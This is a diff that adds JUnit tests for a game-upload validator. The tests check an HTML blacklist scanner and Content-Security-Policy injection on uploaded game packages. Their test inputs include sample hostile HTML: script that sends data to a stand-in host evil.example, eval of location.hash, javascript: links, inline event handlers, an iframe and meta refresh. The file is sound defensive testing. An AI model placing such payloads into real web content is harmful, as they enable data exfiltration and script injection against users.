@@ -230,4 +230,85 @@ class GamePackageValidatorTest {
         }
         return bos.toByteArray();
     }
+
+    // ==================== 上传内容安全：黑名单扫描 + 入口 CSP 注入（2026-11-07 MVP） ====================
+
+    @Test
+    @DisplayName("内容扫描：干净的单文件游戏（库内同款结构）通过")
+    void scanHtmlContent_cleanPasses() {
+        String html = "<!DOCTYPE html><html lang=\"zh-CN\"><head><meta charset=\"UTF-8\">"
+                + "<meta name=\"theme-color\" content=\"#F5F6F3\"></head>"
+                + "<body><script>addEventListener(\"click\",function(){var PAL={onPrimary:1};});</script></body></html>";
+        validator.scanHtmlContent(html); // 不抛即通过
+    }
+
+    @Test
+    @DisplayName("内容扫描：七类黑名单逐类拒绝（外链/协议相对/js: 伪协议/事件属性/动态执行/嵌入/meta refresh）")
+    void scanHtmlContent_blacklistRejected() {
+        String[] malicious = {
+                "<script>fetch(\"https://evil.example/steal\")</script>",   // 外链
+                "<img src=\"//evil.example/1x1.gif\">",                     // 协议相对
+                "<a href=\"javascript:void(0)\">x</a>",                     // js 伪协议
+                "<div onclick=\"steal()\">x</div>",                         // 内联事件属性
+                "<script>eval(location.hash)</script>",                     // 动态执行
+                "<iframe src=\"./phish.html\"></iframe>",                   // 嵌入元素
+                "<meta http-equiv=\"refresh\" content=\"0;url=./x.html\">"  // meta refresh
+        };
+        for (String html : malicious) {
+            GameServiceException e = assertThrows(GameServiceException.class, () -> validator.scanHtmlContent(html));
+            assertEquals(403, e.getCode());
+        }
+    }
+
+    @Test
+    @DisplayName("内容扫描：JS 变量名不误伤（PAL.onPrimary= 这类合法代码放行）")
+    void scanHtmlContent_jsIdentifiersNotFlagged() {
+        String html = "<script>var PAL={};PAL.onPrimary=1;PAL.iconOn=2;reason=3;</script>";
+        validator.scanHtmlContent(html);
+    }
+
+    @Test
+    @DisplayName("CSP 注入：head 内插入 connect-src 'none'，且幂等（重复注入不叠加）")
+    void applyCspMarkup_injectsIntoHeadAndIdempotent() {
+        String html = "<html><head><meta charset=\"UTF-8\"></head><body>x</body></html>";
+        String once = validator.applyCspMarkup(html);
+        assertTrue(once.contains("http-equiv=\"Content-Security-Policy\""));
+        assertTrue(once.contains("connect-src 'none'"));
+        assertTrue(once.indexOf("Content-Security-Policy") < once.indexOf("<meta charset"));
+        String twice = validator.applyCspMarkup(once);
+        assertEquals(once, twice);
+    }
+
+    @Test
+    @DisplayName("CSP 注入：无 head 标签时回退 html 开标签后 / 纯片段前缀")
+    void applyCspMarkup_fallbackPositions() {
+        String noHead = "<html><body>x</body></html>";
+        assertTrue(validator.applyCspMarkup(noHead).startsWith("<html>"));
+        String fragment = "<div>仅片段</div>";
+        assertTrue(validator.applyCspMarkup(fragment).startsWith("<meta http-equiv"));
+    }
+
+    @Test
+    @DisplayName("解压包扫描 + 入口注入：zip 场景端到端（干净包通过且入口带 CSP，毒包 403）")
+    void scanExtractedPackage_andEntryInjection(@TempDir Path tempDir) throws Exception {
+        // 干净包：入口 + 子页均通过，入口被注入 CSP
+        Path cleanDir = tempDir.resolve("clean");
+        Files.createDirectories(cleanDir);
+        Files.writeString(cleanDir.resolve("index.html"),
+                "<html><head><meta charset=\"UTF-8\"></head><body><script>go()</script></body></html>");
+        Files.writeString(cleanDir.resolve("sub.html"), "<html><body>ok</body></html>");
+        validator.scanExtractedPackage(cleanDir);
+        validator.injectEntryCsp(cleanDir, "index.html");
+        String injected = Files.readString(cleanDir.resolve("index.html"));
+        assertTrue(injected.contains("Content-Security-Policy"));
+
+        // 毒包：子页含外链也拦（不只查入口）
+        Path evilDir = tempDir.resolve("evil");
+        Files.createDirectories(evilDir);
+        Files.writeString(evilDir.resolve("index.html"), "<html><body>ok</body></html>");
+        Files.writeString(evilDir.resolve("sub.html"), "<script>fetch('https://evil.example')</script>");
+        GameServiceException e = assertThrows(GameServiceException.class,
+                () -> validator.scanExtractedPackage(evilDir));
+        assertEquals(403, e.getCode());
+    }
 }
